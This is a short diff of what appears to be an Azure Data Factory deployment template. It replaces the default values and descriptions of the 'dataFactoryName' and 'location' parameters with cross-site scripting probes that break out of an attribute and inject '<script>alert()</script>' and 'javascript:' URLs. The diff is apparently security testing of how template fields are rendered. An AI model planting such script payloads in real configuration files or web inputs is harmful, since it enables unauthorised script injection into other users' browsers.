@@ -11,16 +11,16 @@
   "parameters": {
     "dataFactoryName": {
       "type": "string",
-      "defaultValue": "javascript:alert(1)",
+      "defaultValue": "\"><script>alert(3)</script>;javascript:alert(3)",
       "metadata": {
-        "description": "javascript:alert(1)"
+        "description": "\"><script>alert(4)</script>;javascript:alert(4)"
       }
     },
     "location": {
       "type": "string",
-      "defaultValue": "javascript:alert(1)",
+      "defaultValue": "\"><script>alert(1)</script>;javascript:alert(1)",
       "metadata": {
-        "description": "javascript:alert(1)."
+        "description": "\"><script>alert(2)</script>;javascript:alert(2)"
       }
     }
   },
